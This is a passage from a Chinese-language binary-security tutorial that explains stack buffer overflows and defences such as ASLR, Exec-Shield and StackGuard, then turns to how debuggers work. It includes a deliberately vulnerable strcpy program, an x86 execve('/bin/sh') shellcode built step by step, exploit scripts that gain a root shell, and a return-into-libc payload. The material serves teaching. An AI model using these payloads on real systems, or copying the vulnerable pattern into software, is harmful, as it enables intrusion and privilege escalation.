当再次以普通用户权限运行这个程序时，会用root权限调用execve函数，普通用户就会以root权限启动`/bin/sh`。当运行所编译的程序之后，普通用户权限就变成root了。
![root权限](/img/interestingBin/1489115526769.png)


#### 权限如何被夺取

```c
#include <stdio.h>
#include <string.h>

unsigned long get_sp(void)
{
    __asm__("movl %esp, %eax");
}

int cpy(char *str)
{
    char buff[64];
    printf("0x%08lx", get_sp() + 0x10);
    getchar();
    strcpy(buff, str);
    return 0;
}

int main(int argc, char *argv[])
{
    cpy(argv[1]);
    return 0;
}
```

```python
#!/usr/local/bin/python
import sys
from struct import *

if len(sys.argv) != 2:
	addr = 0x41414141
else:
	addr = int(sys.argv[1], 16)

s  = ""
s += "\x31\xc0\x50\x89\xe0\x83\xe8\x10" # 8
s += "\x50\x89\xe3\x31\xc0\x50\x68\x2f" #16
s += "\x2f\x73\x68\x68\x2f\x62\x69\x6e" #24
s += "\x89\xe2\x31\xc0\x50\x53\x52\x50" #32
s += "\xb0\x3b\xcd\x80\x90\x90\x90\x90" #40
s += "\x90\x90\x90\x90\x90\x90\x90\x90" #48
s += "\x90\x90\x90\x90\x90\x90\x90\x90" #56
s += "\x90\x90\x90\x90\x90\x90\x90\x90" #64
s += "\x90\x90\x90\x90"+pack('<L',addr) #72

sys.stdout.write(s)
```

运行两个程序

![运行两个程序](/img/interestingBin/1489116069190.png)

sample3.c的cpy函数会将输入的字符串原原本本得复制到一块只有64字节得内存空间中。由于字符串是由用户任意输入得，因此exploit.py 的输出结果输入给sample3.c，就能成功地以所有者权限运行`/bin/sh`

#### 栈使用运行空间

栈是一种内存的使用方式，栈并不是一种物理上真实存在的东西，它是普通的内存空间。

**向栈存入数据**

![Alt text](/img/interestingBin/1489119852167.png)
在程序开始运行时，先要确定栈的起点(基地址)。假设栈的起点为bffff6fc(ebp=esp)，bffff6fc已经存在0x01。
![Alt text](/img/interestingBin/1489119988554.png)
bffff6fc的值为0x01，执行push命令，push 0x02。最早的地址中还是不变为0x01,0x02保存到相邻的地址中。
![Alt text](/img/interestingBin/1489120781647.png)
栈是从后往前(向地址递减的方向)增长的。若不断执行push指令，push的值就会不断被存入更靠前的内存地址中。esp寄存器中则保存了最新入栈的内存地址。
![Alt text](/img/interestingBin/1489120928505.png)

> 将0x02~0x05的值按顺序push时栈的状态。

**从栈中取出数据**

从栈中取出数据时，使用pop指令，pop指令会从栈的最低位地址取出一条数据。
栈的最低位地址叫做这个栈的“栈顶”(esp)
![Alt text](/img/interestingBin/1489121561708.png)
执行pop eax
最后push的数据为0x05，这条数据会被首先pop出来，因此，eax里面会被存入0x05，这条数据会被首先pop出来。因此，eax里面会被存入0x05。
![Alt text](/img/interestingBin/1489121628523.png)
再执行一次pop，就取出了0x04。
这时，esp的值也会发生变化，先从`bffff6ec`变成bffff6f0，然后再变成bffff6f4。

> 栈，是LIFO(Last In,First Out)，即后进先出。队列是先进先出(FIFO)。

#### 执行任意代码

```c
void func(int x, int y, int z)
{
    int a;
    char buff[8];
}

int main(void)
{
    func(1, 2, 3);
    return 0;
}
```

![汇编](/img/interestingBin/1489129110768.png)

gcc加上-S选项进行编译，然后生成sample4.s文件，即sample4.c的汇编代码。`func`函数有三个参数，分别传递了1,2,3三个数字，而func函数，内部没有进行任何处理。

![汇编代码](/img/interestingBin/1489129503151.png)

在C语言中传递的int型参数，在汇编语言中需要在`call func`之前存放到栈中。尽管这里的入栈操作没有使用push指令，但功能是相同的。

**函数调用时入栈的方法1**

```nasm
push $3  //esp-=4，将3送入esp+0
push $2  //esp-=4，将2送入esp+0
push $1  //esp-=4，将1送入esp+0
```

**函数调用时入栈的方法2**
```nasm
    subl	$12, %esp //esp-=12
	movl	$3, 8(%esp) //将3送入esp+8
	movl	$2, 4(%esp) //将2送入esp+4
	movl	$1, (%esp)  //将1送入esp+0
```
将参数入栈后，通过call指令调用子程序

和jmp不同，call必须记住调用时当前指令的地址，因此在跳转到子程序的地址之前，需要先将返回地址(ret_addr)push到栈中。
当调用func函数时，在跳转到函数起始地址的瞬间，栈的情形如下图：

![栈](/img/interestingBin/1489130168887.png)

程序执行了push ebp。接下来ebp继续递减，为函数内部的局部变量分配内存空间。
![Alt text](/img/interestingBin/1489130235261.png)

此时，若数据溢出，超过了原本分配给数组buff的内存空间，数组buff后面的%ebp、ret_addr以及传递给func函数的参数都会被溢出的数据覆盖。一旦%ebp和ret_addr被覆盖掉，`ret_addr`存放的是函数逻辑结束后返回main函数的目标地址。也就是说，若覆盖了ret_addr，攻击者就可以让程序跳转到任意地址。若攻击者事先准备好一段代码，然后让程序跳转到这段代码，也就相当于成功攻击了“可执行任意代码的漏洞”。

#### 使用gdb查看程序运行情况

gdb是Unix系统中常用的调试器。

|命令|说明|
|------|-------|
|r|运行程序(可以直接带命令行参数)|
|b|设置断点|
|c|在断点处中断后，继续运行程序|
|x/[数字]i|对指定数量的指令进行反汇编|
|disas|同上|
|x/[数字]x|显示指定长度的数据 /可用地址或寄存器作为参数；传递寄存器时要加$|
|x/[数字]s|以字符串形式显示任意长度的数据|
|i r|显示寄存器的值|
|set|向寄存器或内存写入值|
|q|结束调试 /当出于调试中时，程序会询问是否要结束调试，这时输入y可结束调试|

使用gdb对程序进行调试有两种方法：

* 将程序的路径作为参数传递给gdb。如`gdb test00`
* 将gdb挂载到某个进程上.如` gdb attach 1111`

```nasm
$ gdb sample3
GNU gdb 6.1.1 [FreeBSD]
Copyright 2004 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "i386-marcel-freebsd"...(no debugging symbols found)...
(gdb) disas cpy
Dump of assembler code for function cpy:
0x08048540 <cpy+0>:	push   %ebp
0x08048541 <cpy+1>:	mov    %esp,%ebp
0x08048543 <cpy+3>:	sub    $0x48,%esp
0x08048546 <cpy+6>:	call   0x8048530 <get_sp>
0x0804854b <cpy+11>:	add    $0x10,%eax
0x0804854e <cpy+14>:	mov    %eax,0x4(%esp)
0x08048552 <cpy+18>:	movl   $0x8048681,(%esp)
0x08048559 <cpy+25>:	call   0x80483ac <_init+52>
0x0804855e <cpy+30>:	mov    0x8049840,%eax
0x08048563 <cpy+35>:	test   %eax,%eax
0x08048565 <cpy+37>:	jne    0x8048599 <cpy+89>
0x08048567 <cpy+39>:	mov    0x8049844,%eax
0x0804856c <cpy+44>:	mov    0x4(%eax),%edx
0x0804856f <cpy+47>:	sub    $0x1,%edx
0x08048572 <cpy+50>:	mov    %edx,0x4(%eax)
0x08048575 <cpy+53>:	mov    0x4(%eax),%eax
0x08048578 <cpy+56>:	test   %eax,%eax
0x0804857a <cpy+58>:	jns    0x804858b <cpy+75>
0x0804857c <cpy+60>:	mov    0x8049844,%eax
0x08048581 <cpy+65>:	mov    %eax,(%esp)
0x08048584 <cpy+68>:	call   0x80483cc <_init+84>
0x08048589 <cpy+73>:	jmp    0x80485a6 <cpy+102>
0x0804858b <cpy+75>:	mov    0x8049844,%eax
0x08048590 <cpy+80>:	mov    (%eax),%edx
0x08048592 <cpy+82>:	add    $0x1,%edx
0x08048595 <cpy+85>:	mov    %edx,(%eax)
0x08048597 <cpy+87>:	jmp    0x80485a6 <cpy+102>
0x08048599 <cpy+89>:	mov    0x8049844,%eax
0x0804859e <cpy+94>:	mov    %eax,(%esp)
0x080485a1 <cpy+97>:	call   0x80483fc <_init+132>
0x080485a6 <cpy+102>:	mov    0x8(%ebp),%eax
0x080485a9 <cpy+105>:	mov    %eax,0x4(%esp)
0x080485ad <cpy+109>:	lea    0xffffffc0(%ebp),%eax
0x080485b0 <cpy+112>:	mov    %eax,(%esp)
0x080485b3 <cpy+115>:	call   0x80483ec <_init+116>
0x080485b8 <cpy+120>:	mov    $0x0,%eax
0x080485bd <cpy+125>:	leave  
0x080485be <cpy+126>:	ret    
0x080485bf <cpy+127>:	nop    
End of assembler dump.
(gdb) b *0x080485be
Breakpoint 1 at 0x80485be
(gdb) b cpy
Breakpoint 2 at 0x8048546
(gdb) r "\`python -c 'print "A"*80'\`"
Starting program: /usr/home/guest/sample3 "\`python -c 'print "A"*80'\`"
(no debugging symbols found)...(no debugging symbols found)...
Breakpoint 2, 0x08048546 in cpy ()
(gdb) x/8x $ebp
0xbfbfebf8:	0xbfbfec08	0x080485e1	0xbfbfedb0	0xbfbfec20
0xbfbfec08:	0xbfbfec38	0x080484b7	0x00000000	0x00000000
(gdb) x/1s 0xbfbfedb0
0xbfbfedb0:	 ""
(gdb) x/1s 0xbfbfedb0
0xbfbfedb0:	 'A' <repeats 80 times>
(gdb) c              
Continuing.
0xbfbfebb8
Breakpoint 1, 0x080485be in cpy ()
(gdb) x/8x $esp
0xbfbfebfc:	0x41414141	0x41414141	0x41414141	0xbfbfec00
0xbfbfec0c:	0x080484b7	0x00000000	0x00000000	0xbfbfec38
(gdb) si
0x41414141 in ?? ()
(gdb) 

```

![Alt text](/img/interestingBin/QQ截图.png)



要点在于：
 * 0xbfbfebf8的值为%ebp
 * 0xbfbfebfc的值为ret_addr
 * 后面是传递给函数的参数

sample3的cpy函数只有一个str函数，因此位置紧挨着ret_addr

![Alt text](/img/interestingBin/1489134017439.png)

此处，由于cpy中的定义buff变量溢出，因此后面的内存空间都会全部被覆盖。
0xbfbfebfc的值被改写成0x41414141，因此当程序运行到0x080485be的指令时，就会跳到0x41414141这个地址，导致Segmentation falut。若在buff中植入一些机器语言指令，然后将返回地址改为这些指令的地址，这样就可以让计算机执行任意代码。

#### 攻击代码示例

攻击者要执行的代码叫shellcode，一般地，只要启动了`/bin/sh`，攻击者就能够完全控制计算机，因此shellcode指的就是一段非常短小的机器语言代码，它的功能就是`/bin/sh`

例子：

```c
#include <unistd.h>

int main(void)
{
    char *data[2];
    char sh[] = "/bin/sh";

    data[0] = sh;
    data[1] = NULL;

    execve(sh, data, NULL);
    return 0;
}
```

> 先声明一个char型的指针型数组，然后在data[0]中存入`/bin/sh`字符串的指针，在data[1]中存入了NULL。由于`/bin/sh`不需要参数，因此data数组只需要两个元素就够。

`execv`的参数为下列3个：
* /bin/sh字符串的指针
* 包含传递给程序的参数在内的数组的地址
* 环境变量

> 此处环境变量不是必须的，因此将其设为NULL。
> 
> `/bin/sh`不需要参数，因此data指存放了`/bin/sh`字符串的指针

![Alt text](/img/interestingBin/1489134779288.png)

由于sample5是采用静态链接编译的，因此execve本身也位于可执行文件内部。用gdb对execve进行反汇编，可以发现其中调用了int $0x80

![Alt text](/img/interestingBin/1489134947140.png)

int $0x80是一个系统调用。

前面的`mov $0x3b,%eax`指令，它的功能是将0x3b存入eax寄存器。实际上，这个值是execve系统调用的编号，系统内核会根据这个编号来识别不同的系统调用。

系统调用编号(usr/include/sys/syscall.h)：
![Alt text](/img/interestingBin/1489135179351.png)

系统调用的编号:
* 1:exit
* 2:fork
* 3:read
* 4:write

以此类推，59号对应execve，将59转换为十六进制就是0x3b

Linux系统中，execve的编号为11。由于系统调用的编号在每个环境中不同，因此在制作shellcode的时候，需要注意。

#### 生成可用作shellcode的机器语言代码

![Alt text](/img/interestingBin/shellcode.png)

在调用execve的地方设置断点，确认此时内存状态。

![Alt text](/img/interestingBin/1489141752365.png)

execve需三个参数，分别为：

* 第一参数:0xbfbfebb4(/bin/sh地址)
* 第二参数:0xbfbfebbc(/bin/sh的地址以及内容为NULL的数组)
* 第三参数:0x00000000(NULL)

已经将sample5.c所设计的样子将数据排列好。
0xbfbfebac和0xbfbfebb0与execv的调用无关，因此可以将它们删除掉，于是得到一段最低限度的内存配置

![Alt text](/img/interestingBin/1489142170085.png)

编写汇编代码，将上述数据写入栈当前esp以后的位置，并调用execve。


```nasm
.globl main
main:
    xorl  %eax, %eax
    pushl %eax   ;data[1](NULL)
    movl  %esp, %eax
    subl  $0x0c,%eax
    pushl %eax   ;data[0](/bin/sh地址)
    movl  %esp, %ebx
    pushl $0x0068732f ;字符串"/sh\0"
    pushl $0x6e69622f  ;字符串"/bin"
    movl  %esp, %edx
    xorl  %eax, %eax
    pushl %eax   ;第三参数
    pushl %ebx   ;第二参数
    pushl %edx   ;第一参数
    pushl %eax   ;call的返回地址(可以为任意值)
    movb  $0x3b, %al
    int   $0x80
```
使用objdump将上面的代码转换为 机器语言。
![Alt text](/img/interestingBin/1489142909808.png)

将机器码编译成可执行文件

![Alt text](/img/interestingBin/1489143141775.png)

shellcode执行成功。

> 只要将这段机器码嵌入目标程序，并设法让其执行，就能够夺取系统的控制权

#### 对0x00的改进

上面的shellcode还无法对sample3进行攻击，因为里面出现了0x00。在sample3中，复制数据时使用了strcpy函数，这个函数会用0x00来判断字符串的结尾。因此，当shellcode中间出现0x00时，strcpy就无法完整地复制shellcode地数据。

在sample6中，在对字符串/sh\0进行push地地方出现了0x00。

```c
804840f:	68 2f 73 68 00   push $0x68732f
8048414:	68 2f 62 69 6e   push $0x6e69622f
```
解决该问题可以采用下面办法：
* 将/bin/sh改为/bin//sh以凑齐8个字节
* 在前面先push $0

> 尽管多一个斜杠，但该命令运行不会有问题。因此，将`/sh\0`改为`//sh`，这样就成功消除了push里的`0x00`

用xor和push相互结合的方法，向栈中放入一个0x00作为字符串结尾的标志，这样就能避免整段代码出现`0x00`


```c
.globl main
main:
    xorl  %eax, %eax
    pushl %eax
    movl  %esp, %eax
    subl  $0x10, %eax
    pushl %eax  
    movl  %esp, %ebx 
    xorl  %eax, %eax  
    pushl %eax        ;push 0x00000000
    pushl $0x68732f2f ;push字符串"//sh"
    pushl $0x6e69622f ;push字符串"/bin"
    movl  %esp, %edx
    xorl  %eax, %eax
    pushl %eax
    pushl %ebx
    pushl %edx
    pushl %eax
    movb  $0x3b, %al
    int   $0x80
```
![Alt text](/img/interestingBin/1489144383415.png)

sample9.c的代码：

```c
unsigned char shellcode[] = {
    0x31, 0xc0,                      // xor %eax, %eax
    0x50,                            // push %eax
    0x89, 0xe0,                      // mov %esp, %eax
    0x83, 0xe8, 0x10,                // sub $0x10, %eax
    0x50,                            // push %eax
    0x89, 0xe3,                      // mov %esp, %ebx
    0x31, 0xc0,                      // xor %eax, %eax
    0x50,                            // push %eax
    0x68, 0x2f, 0x2f, 0x73, 0x68,    // push $0x68732f2f
    0x68, 0x2f, 0x62, 0x69, 0x6e,    // push $0x6e69622f
    0x89, 0xe2,                      // mov %esp, %edx
    0x31, 0xc0,                      // xor %eax, %eax
    0x50,                            // push %eax
    0x53,                            // push %ebx
    0x52,                            // push %edx
    0x50,                            // push %eax
    0xb0, 0x3b,                      // mov $0x3b, %al
    0xcd, 0x80,                      // int $0x80
};

int main(void)
{
    void (*p)(void);
    p = (void(*)())shellcode;
    p();
    return 0;
}
```

![Alt text](/img/interestingBin/1489145641910.png)

shellcode完成，可在`exploit.py`使用

将这段代码插入到sample3的内存空间，然后将返回地址改为shellcode的起始地址，就可以夺取系统权限。


![Alt text](/img/interestingBin/0310210948.png)

函数的返回目标地址已经变成shellcode。

sample3.c在运行时候显示shellcode的地址，纯属演示效果。实际中，并不知道shellcode位于目标进程的哪个地址，只能推测。

不过栈的位置是可以推算出来的，因此可以尽量在内存中填充NOP(0x90)指令，然后将shellcode放在最后，这样可提高shellcode被执行概率。

此次使用的是strcpy函数，因此只要去除0x00就可以，但有些软件会对字符串有更多的限制，例如只接受英文字母。为了应付该情况，业界曾对用只用特定字符集编写shellcode进行了大量研究。

**近年由于操作系统默认启用了一些安全机制，传统的缓冲区溢出攻击已经不管用**

> `printf`类函数的字符串格式化bug也是具有代表性的漏洞。


```c
#include <stdio.h>
void main(int argc, char *argv[])
{
	printf(argv[1]);
```

> printf类函数中，有一个特殊的格式转换符%n,它可以向参数中指针所指的位置写入当前已输出的数据长度。利用%n，可以向任意地址写入任意值。和缓冲区溢出相比，该漏洞没那么严重。

### 防御攻击的技术


#### 地址随机化:ASLR

ASLR(Address Space Layout Randomization)是一种对栈、模块、动态分配的内存空间等的地址(位置)进行随机分配的机制。

ASLR属于操作系统功能，例如Ubuntu12.04中，可通过`/proc/sys/kernel/randomize_va_space`来查看和修改该设置。
切换到root用户，运行：

```c
guest@ubuntu:~$ cat /proc/sys/kernel/randomize_va_space
2
guest@ubuntu:~$ sudo echo 0 /proc/sys/kernel/randomize_va_space
[sudo] password for guest: 
0 /proc/sys/kernel/randomize_va_space
```
用cat命令查看`randomize_va_space`的值，输出的结果可能是0、1或者2.
* 0：禁用
* 1：除堆以外随机化
* 2：全部随机化（默认）

通过以下程序确认ASLR的效果，该程序很简单，它会显示出用`malloc`分配的内存空间地址以及栈的地址。

```c
#include <stdio.h>
#include <stdlib.h>
unsigned long get_sp(void)
{
  __asm__("movl %esp, %eax");
}
int main(void)
{
  printf("malloc: %p\n", malloc(16));
  printf(" stack: 0x%lx\n", get_sp());
  return 0;
}
```

在启用ASLR的状态下，反复运行该程序，会发现程序地址不同。

![Alt text](/img/interestingBin/1489156288416.png)

如果地址布局无法推测出来，也就无法知道shellcode的具体地址。

同样的程序，若在禁用ASLR的状态下运行，则差异很大。

![Alt text](/img/interestingBin/1489156557490.png)

> 关闭ASLR之后，无论运行多少次，显示出的地址都完全相同。

演示程序test01，该程序具备缓冲区溢出漏洞，它会用`strcpy`复制命令行参数中输入的字符串。

![Alt text](/img/interestingBin/1489157112086.png)

当启用ASLR时，test01所显示的地址每次都不同，因此无法将正确的地址传递给exploit.py，也就无法成功获取系统权限。

#### Exec-Shield

除存放可执行代码的内存空间以外，对其余内存空间尽量禁用执行权限：Exec-Shield

Exec-Shield是一种通过“限制内存空间的读写和执行权限”来防御攻击的机制。

通常情况下，不会在用作栈的内存空间里存放可执行的机器代码，因此可以将栈空间的权限设为可读写但不可执行。反过来，在代码区域中存放的机器语言代码，通常也不需要在运行时进行改写，因此可以将这部分内存的权限设置为不可写入。这样，即便将shellcode复制到栈中，若这些代码无法执行，就会产生Segmentation fault，导致程序停止运行。

要在系统中查看某个程序进程内存空间的读写和执行权限，在程序运行时输出`/proc/<PID>maps`就行

```c
root@ubuntu:/home/guest# ps -aef | grep test02
root      8047  8033  0 06:59 pts/0    00:00:00 grep --color=auto test02
root@ubuntu:/home/guest# cat /proc/8033/maps | grep stack
bfaec000-bfb0d000 rw-p 00000000 00:00 0          [stack]
```

test02是test01加上Exec-Shield之后的版本，其中栈空间为`bfdcc00~bfded000`,它的权限是rw-p，没有代表执行权限的x.

测试Exec-Shield的效果：

```c
guest@ubuntu:~$ ./test02 `python exploit.py "bffff710"` aaaabbbbccccdddd
0xbfded260
Segmentation fault
```
尽管输入的地址和输出的地址一样，但攻击还是失败了。

**ASLR的思路是防止攻击者猜中地址，而Exec-Shield则是在地址一致的情况下，攻击者也无法执行其中的机器语言代码**

> 查看test01的`/proc/<PID>/maps`，就会发现其栈空间也带有执行权限。这也是test01和test02的区别。

#### StackGuard

**`StackGuard`是一种在编译时在各函数入口和出口插入用于检测栈数据完整性的机器语言代码的方法，它属于编译器的安全机制**

例子：

![StackGuard](/img/interestingBin/1489158826264.png)

在启用ASLR或Exec-Shield时，上述程序会产生Segmentation fault，但StackGuard则是让test03检测自身的异常，并主动停止运行。

test03具有栈缓冲区溢出的漏洞，当栈内数据发生溢出时，StackGuard代码能够检测这异常情况，并显示stack smashing detected消息，强制终止程序运行。

查看test03.s的代码，就能找到添加StackGuard的代码。


![StackGuard代码](/img/interestingBin/0310231832.png)

> %gs:20在每次程序运行时，都会存入一个随机数，将该随机数复制到函数所使用的栈空间的最后。由于60(%esp)后面就是ebp和ret_addr，因此这样的配置可以保护关键地址的数据不被篡改。

> 当函数即将返回之前，程序将%gs:20的值与60(%esp)进行比对。若由于某些原因导致溢出，ebp和ret_addr被覆盖，那么60(%esp)的值也会被同时覆盖。当检测到溢出时，程序将跳转到__stack_chk_fail，并终止运行。

总之，StackGuard机制所保护的是ebp和ret_addr，是一种针对典型栈缓冲区溢出攻击的防御手段。

<small>ubuntu12.04的gcc中，在编译时默认加上StackGuard代码，要禁用StackGuard需加上-fbo-stack-protector选项</small>


### 绕开安全机制

#### Return-into-libc

Return-into-libc是一种破解Exec-Shield的方法，思路是"即便无法执行任意代码(shellcode)，最终只要能运行任意程序也能获得系统权限"

**Return-into-libc的基本原理是通过调整参数和栈的配置，使得程序能够跳转到libc.so中的system函数以及exec类函数，借此运行`/bin/sh`等程序**

使用`ldd`命令查看程序在运行时所加载的库。

![ldd](/img/interestingBin/1489160105208.png)

几乎所有的程序在运行时都会加载`libc.so`，或者是在编译时进行静态链接。因此只要能够调用libc中的system函数和exec类函数，就能够夺取系统权限。

例子（关闭ASLR实验）

![Alt text](/img/interestingBin/1489160347008.png)

得到system和exit的地址。
这次就不需要将返回地址改成位于栈中的shellcode地址，而是改成system函数的入口地址，将system函数的返回目标设为exit，并将`/bin/sh`的地址作为参数传递过去。

```python
#!/usr/bin/python

import sys
from struct import *

if len(sys.argv) != 2:
	addr = 0x41414141
else:
	addr = int(sys.argv[1], 16) + 0x08

fsystem = int("b7e6c430", 16)
fexit   = int("b7e5ffb0", 16)

data  = "\x90\x90\x90\x90\x90\x90\x90\x90"
data += "\x90\x90\x90\x90\x90\x90\x90\x90"
data += "\x90\x90\x90\x90\x90\x90\x90\x90"
data += "\x90\x90\x90\x90\x90\x90\x90\x90"
data += pack('<L', fsystem)
data += pack('<L', fexit)
data += pack('<L', addr)
data += "/bin/sh"

sys.stdout.write(data)
```

演示结果：
![Alt text](/img/interestingBin/1489160621005.png)
 
 > test02已开启Exec-Shield机制，但还是绕过了它并取得成功夺取的权限，这是一个简单的Return-into-libc的例子。但还是需要没有ASLR或者StackGuard防护机制才能攻击成功

在此例中，使用了system函数代替了shellcode。

#### ROP

Return-into-libc是利用库函数(libc)来代替shellcode发动攻击的方法。然而ASLR将加载的模块全部随机化，攻击也会因为无法获得准确的模块地址(不知道system和exec的地址)而失败。

**ROP(Return-Oriented-Programming)，面向返回编程。这种攻击来源于利用随机化的那些模块内部汇编代码拼接所需程序逻辑进行攻击的思路**

ROP 是一种高级的堆栈溢出攻击。这类攻击往往利用操作堆栈调用时的程序漏洞，通常是缓冲区溢出。在缓冲区溢出中，在将数据存入内存前未能正确检查适当范围的函数会收到多于正常承受范围的数据，如果数据将写入堆栈，多余的数据会溢出为函数变量分配的空间并覆盖替换 return 地址。在原本用以重定向控制流并返回给调用者的地址被覆盖替换后，控制流将改写到新分配的地址

ROP相关资料:
- [Return-into-libc 攻击及其防御](https://www.ibm.com/developerworks/cn/linux/1402_liumei_rilattack/)
- [因特尔发布新的技术规范去防御 ROP 攻击](http://mudongliang.github.io/2016/08/04/intel-release-new-technology-specifications-to-protect-against-rop-attacks-zh.html)
- [Deep Dive into ROP Payload Analysis](https://www.exploit-db.com/docs/35355.pdf)


## 调试器和安全编程技巧

调试器被称为“黑客之瞳”。调试器能跟踪一个进程的运行时状态。大多数调试器具有运行、暂停执行和单步执行、设置断点、修改寄存器和内存数据值以及捕获发生在目标进程的异常事件。

**调试器应当具备两种能力：**
* **打开一个可执行文件并使之以自身进程的形式运行起来的能力**
* **附加一个现有进程的能力**


![调试器类型](/img/interestingBin/1489198396343.png)

![调试器简易功能](/img/interestingBin/1489198921980.png)


![调试器功能](/img/interestingBin/调试器.png)

### 调试器的工作原理
最简单的调试器代码wdbg01a.cpp：

```c
#include "stdafx.h"
#include <Windows.h>
int _tmain(int argc, _TCHAR* argv[])
{
    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    
    if(argc < 2){
        fprintf(stderr, "C:\\>%s <sample.exe>\n", argv[0]);
        return 1;
    }

    memset(&pi, 0, sizeof(pi));
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(STARTUPINFO);
//通过GreateProcess()函数启动调试目标进程(也叫调试对象或者被调试程序debugge)
    BOOL r = CreateProcess(
        NULL, argv[1], NULL, NULL, FALSE, 
        NORMAL_PRIORITY_CLASS | CREATE_SUSPENDED | DEBUG_PROCESS,
        NULL, NULL, &si, &pi);
    if(!r)
        return -1;

    ResumeThread(pi.hThread);

    while(1) {
        DEBUG_EVENT de;
        if(!WaitForDebugEvent(&de, INFINITE))
            break;
        
        DWORD dwContinueStatus = DBG_CONTINUE;
        
        switch(de.dwDebugEventCode)
        {
        case CREATE_PROCESS_DEBUG_EVENT:
            printf("CREATE_PROCESS_DEBUG_EVENT\n");
            break;
        case CREATE_THREAD_DEBUG_EVENT:
            printf("CREATE_THREAD_DEBUG_EVENT\n");
            break;
        case EXIT_THREAD_DEBUG_EVENT:
            printf("EXIT_THREAD_DEBUG_EVENT\n");
            break;
        case EXIT_PROCESS_DEBUG_EVENT:
            printf("EXIT_PROCESS_DEBUG_EVENT\n");
            break;
        case EXCEPTION_DEBUG_EVENT:
            if(de.u.Exception.ExceptionRecord.ExceptionCode != 
				EXCEPTION_BREAKPOINT)
			{
                dwContinueStatus = DBG_EXCEPTION_NOT_HANDLED;
			}
            printf("EXCEPTION_DEBUG_EVENT\n");
            break;
        case OUTPUT_DEBUG_STRING_EVENT:
            printf("OUTPUT_DEBUG_STRING_EVENT\n");
            break;
        case RIP_EVENT:
            printf("RIP_EVENT\n");
            break;
        case LOAD_DLL_DEBUG_EVENT:
            printf("LOAD_DLL_DEBUG_EVENT\n");
            break;
        case UNLOAD_DLL_DEBUG_EVENT:
            printf("UNLOAD_DLL_DEBUG_EVENT\n");
            break;
        }
        if(de.dwDebugEventCode == EXIT_PROCESS_DEBUG_EVENT)
            break;
        ContinueDebugEvent(
            de.dwProcessId, de.dwThreadId, dwContinueStatus);
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
```

调用CreateProcess函数时，若设置了`DEBUG_PROCESS`或 `DEBUG_ONLY_THIS_PROCESS`标志，则启动的进程(测试对象)中所产生的异常都会被调试器捕捉到。

* **`DEBUG_PROCESS`:**调试对象所产生的子进程，以及子进程的子进程作为调试对象。
* **`DEBUG_ONLY_THIS_PROCESS`:**只将通过Create Process启动的那一个进程作为调试对象。

> CreateProcess函数的第1参数或者第2参数可用于传递目标程序的路径，然后便可以启动进程。

[CreateProcess函数](https://msdn.microsoft.com/en-us/library/windows/desktop/ms682425(v=vs.85).aspx)(https://msdn.microsoft.com/en-us/library/windows/desktop/ms682425(v=vs.85).aspx)：

```c
BOOL WINAPI CreateProcess(
  _In_opt_    LPCTSTR               lpApplicationName, //可执行模块名称
  _Inout_opt_ LPTSTR                lpCommandLine, //命令行字符串
  _In_opt_    LPSECURITY_ATTRIBUTES lpProcessAttributes, 
  _In_opt_    LPSECURITY_ATTRIBUTES lpThreadAttributes,
  _In_        BOOL                  bInheritHandles, //句柄继承选项
  _In_        DWORD                 dwCreationFlags,  //创建标志
  _In_opt_    LPVOID                lpEnvironment, //新进程的环境变量块
  _In_opt_    LPCTSTR               lpCurrentDirectory, //当前路径
  _In_        LPSTARTUPINFO         lpStartupInfo,  //启动信息
  _Out_       LPPROCESS_INFORMATION lpProcessInformation  //进程信息
);
```

通过`CREATE_SUSPENDED`标志可以让进程在启动后进入挂起状态。当设置这一标志时，`CreateProcess`函数调用完成之后，新进程中的所有线程都会暂停。尽管程序没有在运行，但程序 的可执行文件已经被加载到内存，这时可以对调试对象的数据进行改写。

在此程序中，没有任何操作而是直接调用了`ResumeThread`函数，这时调试对象的所有线程就会恢复运行。

ResumeThread函数：

```c
DWORD WINAPI ResumeThread(
  _In_ HANDLE hThread  //线程句柄
);
```

当调试对象程序开始运行之后，调试器就开始等待捕捉异常。
调试事件会通过`WaitForDebugEvent`函数来进行接收。

[WaitForDebugEvent](https://msdn.microsoft.com/en-us/library/windows/desktop/ms681423(v=vs.85).aspx)函数（https://msdn.microsoft.com/en-us/library/windows/desktop/ms681423(v=vs.85).aspx）：

```cpp
BOOL WINAPI WaitForDebugEvent(
  //保存调试事件信息的结构体指针
  _Out_ LPDEBUG_EVENT lpDebugEvent,
  //事件等待事件(毫秒)
  _In_  DWORD         dwMilliseconds
);
```

`WaitForDebugEvent`函数的第1参数传递了一个DEBUG_EVENT结构体，捕捉到的调试事件会被存放在这个结构体中，第二参数dwMilliseconds如果设置了INFINITE则表示一直等待。

[DEBUG_EVENT](https://msdn.microsoft.com/en-us/library/windows/desktop/ms679308(v=vs.85).aspx)结构体（https://msdn.microsoft.com/en-us/library/windows/desktop/ms679308(v=vs.85).aspx）的定义如下：

```cpp
typedef struct _DEBUG_EVENT {
  DWORD dwDebugEventCode;
  DWORD dwProcessId;
  DWORD dwThreadId;
  union {
    EXCEPTION_DEBUG_INFO      Exception;
    CREATE_THREAD_DEBUG_INFO  CreateThread;
    CREATE_PROCESS_DEBUG_INFO CreateProcessInfo;
    EXIT_THREAD_DEBUG_INFO    ExitThread;
    EXIT_PROCESS_DEBUG_INFO   ExitProcess;
    LOAD_DLL_DEBUG_INFO       LoadDll;
    UNLOAD_DLL_DEBUG_INFO     UnloadDll;
    OUTPUT_DEBUG_STRING_INFO  DebugString;
    RIP_INFO                  RipInfo;
  } u;
} DEBUG_EVENT, *LPDEBUG_EVENT;
```

其中第一个成员dwDebugEventCode代表调试事件编号。
`dwProcessID`为进程ID，`dwThreadID`为线程ID。

| 调试事件     |   含义 | 
| :-------- | --------:| 
| CREATE_PROCESS_DEBUG_EVEN  |创建进程|
|CREATE_THREAD_DEBUG_EVENT|创建线程|
|EXCEPTION_DEBUG_EVENT|发生异常|
|EXIT_PROCESS_DEBUG_EVENT|进程结束|
|EXIT_THREAD_DEBUG_EVENT|线程结束|
|LOAD_DLL_DEBUG_EVENT|加载DLL|
|OUTPUT_DEBUG_STRING_EVENT|调用OutputDebugString函数|
|RIP_EVENT|系统调试错误|
|UNLOAD_DLL_DEBUG_EVENT|卸载DLL|

